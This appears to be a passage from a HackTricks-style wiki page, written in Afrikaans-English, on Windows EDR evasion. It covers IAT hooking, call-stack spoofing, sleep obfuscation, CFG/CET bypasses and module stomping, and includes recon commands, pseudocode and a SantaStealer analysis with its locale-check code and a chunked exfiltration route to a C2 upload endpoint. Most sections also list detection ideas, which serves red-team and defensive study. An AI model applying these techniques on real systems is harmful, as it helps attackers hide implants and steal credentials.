- Herstel betroubare gebruik van process-spawning post-ex commands teen call-stack–gebaseerde detections deur CreateProcessA/W te wrap.

Minimale IAT hook-skets (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Pas die patch toe ná relocasies/ASLR en voor die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT value wat jy vasgelê het voor patching of via LdrGetProcedureAddress.
- Gebruik RW → RX transitions vir PIC en vermy om writable+executable pages te laat.

Call‑stack spoofing stub
- Draugr‑styl PIC stubs bou ’n valse call chain (return addresses in benign modules) en pivot dan na die regte API.
- Dit defeat detections wat canonical stacks van Beacon/BOFs na sensitive APIs verwag.
- Pair dit met stack cutting/stack stitching techniques om binne verwagte frames te land voor die API prologue.

Operational integration
- Voeg die reflective loader voor post-ex DLLs in sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik ’n Aggressor script om target APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion path sonder code changes.

Detection/DFIR considerations
- IAT integrity: entries wat na non-image (heap/anon) addresses resolve; periodieke verification van import pointers.
- Stack anomalies: return addresses wat nie aan loaded images behoort nie; abrupte transitions na non-image PIC; inkonsekwente RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes na IAT, vroeë DllMain activity wat import thunks wysig, onverwante RX regions wat by load geskep word.
- Image-load evasion: as jy LoadLibrary* hook, monitor suspicious loads van automation/clr assemblies wat met memory masking events korreleer.

Related building blocks and examples
- Reflective loaders wat IAT patching tydens load uitvoer (bv. TitanLdr, AceLdr)
- Memory masking hooks (bv. simplehook) en stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (bv. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

As jy ’n reflective loader beheer, kan jy imports hook **tijdens** `ProcessImports()` deur die loader se `GetProcAddress` pointer te vervang met ’n custom resolver wat eers hooks toets:

- Bou ’n **resident PICO** (persistent PIC object) wat oorleef nadat die transient loader PIC homself vrylaat.
- Export ’n `setup_hooks()` function wat die loader se import resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, spring ordinal imports oor en gebruik ’n hash-based hook lookup soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, return dit; anders delegiseer na die regte `GetProcAddress`.
- Registreer hook targets by link time met Crystal Palace `addhook "MODULE$Func" "hook"` entries. Die hook bly geldig omdat dit binne die resident PICO leef.

Dit lewer **import-time IAT redirection** sonder om die gelaaide DLL se code section post-load te patch.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks trigger net as die function werklik in die target se IAT is. As ’n module APIs via ’n PEB-walk + hash resolve (geen import entry), force ’n regte import sodat die loader se `ProcessImports()` pad dit sien:

- Vervang hashed export resolution (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte reference soos `&WaitForSingleObject`.
- Die compiler emit ’n IAT entry, wat interception moontlik maak wanneer die reflective loader imports resolve.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC primitives** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang waits, wrap die call in ’n Ekko-style obfuscation chain wat die in-memory image tydens idle enkripteer:

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` met saamgestelde `CONTEXT` frames aanroep.
- Tipiese chain (x64): stel image na `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` oor die volle gemapte image → voer die blokkerende wait uit → RC4 decrypt → **herstel per-section permissions** deur PE sections te loop → signaal completion.
- `RtlCaptureContext` verskaf ’n template `CONTEXT`; kloon dit in multiple frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap te invoke.

Operasionele detail: return “success” vir lang waits (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon verberg die module vir scanners tydens idle windows en vermy die klassieke “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts van `CreateTimerQueueTimer` callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` gebruik op groot, aaneenlopende image-grootte buffers.
- Groot-reeks `VirtualProtect` gevolg deur custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

Op CFG-enabled targets sal die eerste indirect jump na ’n mid-function gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses crash met `STATUS_STACK_BUFFER_OVERRUN` omdat die gadget nie in die module se CFG metadata is nie. Om Ekko/Kraken-style chains lewend te hou binne hardened processes:

- Registreer elke indirect destination wat deur die chain gebruik word met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID` entries.
- Vir addresses binne loaded images (`ntdll`, `kernel32`, `advapi32`), moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volle image size** dek.
- Vir manually mapped/PIC/stomped regions, gebruik die **allocation base** en allocation size in plaas daarvan.
- Merk nie net die dispatch gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) en enige attacker-controlled executable sections wat indirekte targets gaan word.

Dit verander ROP/JOP-style sleep chains van “werk net in non-CFG processes” na ’n herbruikbare primitive vir `explorer.exe`, browsers, `svchost.exe`, en ander endpoints wat met `/guard:cf` saamgestel is.

### CET-safe stack spoofing for sleeping threads

Volledige `CONTEXT` replacement is luidrugtig en kan breek op CET Shadow Stack systems omdat ’n gespoofde `Rip` steeds met die hardware shadow stack moet ooreenstem. ’n Veiliger sleep-masking pattern is:

- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Maak ’n backup van die huidige thread se regte TEB/TIB.
- Capture die regte sleeping context met `GetThreadContext`.
- Kopieer **net** die regte `Rip` in die spoof context, terwyl die gespoofde `Rsp`/stack state intact bly.
- Tydens die sleep window, kopieer die spoof thread se `NT_TIB` na die huidige TEB sodat stack walkers unwind binne ’n legitieme stack range.
- Nadat die wait klaar is, restore die oorspronklike TIB en thread context.

Dit behou ’n CET-consistent instruction pointer terwyl dit EDR stack walkers mislei wat TEB stack metadata vertrou om unwinds te valideer.

### APC-based alternative: Kraken Mask

As timer-queue dispatch te signatured is, kan dieselfde sleep-encrypt-spoof-restore sequence vanuit ’n suspended helper thread met queued APCs uitgevoer word:

- Skep ’n helper thread met `NtTestAlert` as entrypoint.
- Queue voorbereide `CONTEXT` frames/APCs met `NtQueueApcThread` en drain hulle met `NtAlertResumeThread`.
- Stoor die chain state op die heap in plaas van die helper stack om te vermy dat die default 64 KB thread stack uitgeput raak.
- Gebruik `NtSignalAndWaitForSingleObject` om atomies die start event te signaal en te block.
- Suspend die main thread voor die TIB/context restore (`NtSuspendThread` → restore → `NtResumeThread`) om die race window te verminder waar ’n scanner ’n half-gerestore stack kan vang.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue` signature met ’n helper-thread/APC signature terwyl dit dieselfde RC4 masking en stack-spoofing goals behou.

Additional detection ideas
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits, of APC dispatch.
- `GetThreadContext`/`SetThreadContext` omhul rondom `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, of `ConnectNamedPipe`.
- `NtQueryInformationThread` gevolg deur direkte writes in die huidige thread se TEB/TIB stack bounds.
- `NtQueueApcThread`/`NtAlertResumeThread` chains wat indirek na `SystemFunction032`, `VirtualProtect`, of section-permission restoration helpers lei.
- Herhaalde gebruik van kort gadget signatures soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch pivots binne signed modules.


## Precision Module Stomping

Module stomping voer payloads uit vanaf die **`.text` section van ’n DLL wat reeds binne die target process gemap is** in plaas daarvan om duidelike private executable memory te allokeer of ’n nuwe sacrificial DLL te laai. Die overwrite target moet ’n **gelaaide, disk-backed image** wees wie se code space die payload kan absorbeer sonder om code paths wat die proses nog nodig het, te korrupteer.

### Reliable target selection

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is broos: die DLL is dalk nie in die remote process gelaai nie, en ’n te klein code region sal die proses crash. ’n Meer betroubare workflow is:

1. Enumereer die target process modules en hou ’n **names-only include list** van DLLs wat reeds gelaai is.
2. Bou die payload eerste en teken sy **presiese byte size** aan.
3. Scan kandidaat-DLLs op disk en vergelyk die PE section **`.text` `Misc_VirtualSize`** teen die payload size. Dit maak meer saak as die file size omdat dit die grootte van die executable section weerspieël **wanneer dit in memory gemap is**.
4. Parse die **Export Address Table (EAT)** en kies ’n exported function RVA as die stomp start offset.
5. Bereken die **blast radius**: as die payload die gekose function boundary oorskry, sal dit aangrensende exports oorskryf wat daarna in memory uitgelê is.

Tipiese recon/selection helpers wat in die wild gesien word:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operasionele notas
- Verkies DLLs **reeds gelaai** in die afgeleë proses om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat selde deur die teiken-toepassing uitgevoer word, anders kan normale code paths die stomped bytes raak voor of na thread creation.
- Groot implants vereis dikwels dat shellcode embedding verander van ’n string literal na ’n **byte-array/braced initializer** sodat die volle buffer korrek in die injector source voorgestel word.

Detectie-idees
- Afgeleë writes in **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) eerder as die meer algemene private RWX/RX allocations.
- Export entry points wie se in-memory bytes nie meer ooreenstem met die backing file op disk nie.
- Afgeleë threads of context pivots wat uitvoering begin binne ’n legitieme DLL export wie se eerste bytes onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)` / `WriteProcessMemory` sequences teen DLL `.text` pages gevolg deur thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in een workflow kombineer.

### Keyboard layout gating & sandbox delay

- ’n Config flag (`anti_cis`) tel geïnstalleerde keyboard layouts op via `GetKeyboardLayoutList`. As ’n Cyrillic layout gevind word, laat die sample ’n leë `CIS` marker val en beëindig voor die stealers loop, wat verseker dat dit nooit op uitgeslote locales detoneer nie terwyl dit ’n hunting artifact agterlaat.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Laag-vir-laag `check_antivm` logika

- Variant A loop deur die process list, hash elke naam met ’n custom rolling checksum, en vergelyk dit met embedded blocklists vir debuggers/sandboxes; dit herhaal die checksum oor die computer name en kyk na working directories soos `C:\analysis`.
- Variant B inspekteer system properties (process-count floor, recent uptime), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox additions op te spoor, en voer timing checks rondom sleeps uit om single-stepping te merk. Enige treffer breek af voordat modules begin.

### Fileless helper + double ChaCha20 reflective loading

- Die primary DLL/EXE embed ’n Chromium credential helper wat óf na disk gedrop word óf handmatig in-memory gemap word; fileless mode los imports/relocations self op sodat geen helper artifacts geskryf word nie.
- Daardie helper stoor ’n second-stage DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-byte keys + 12-byte nonces). Ná albei passes, laai dit die blob reflectively (geen `LoadLibrary` nie) en roep exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator routines gebruik direct-syscall reflective process hollowing om in ’n live Chromium browser in te spuit, AppBound Encryption keys te erf, en passwords/cookies/credit cards direk uit SQLite databases te decrypt ondanks ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iter deur ’n globale `memory_generators` function-pointer table en spawn een thread per enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, ens.). Elke thread skryf results in shared buffers en rapporteer sy file count ná ’n ~45s join window.
- Sodra dit klaar is, word alles met die statically linked `miniz` library as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` slaap dan 15s en stream die archive in 10 MB chunks via HTTP POST na `http://<C2>:6767/upload`, terwyl dit ’n browser `multipart/form-data` boundary vervals (`----WebKitFormBoundary***`). Elke chunk voeg `User-Agent: upload`, `auth: <build_id>`, opsioneel `w: <campaign_tag>`, by, en die laaste chunk voeg `complete: true` by sodat die C2 weet reassembly is klaar.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
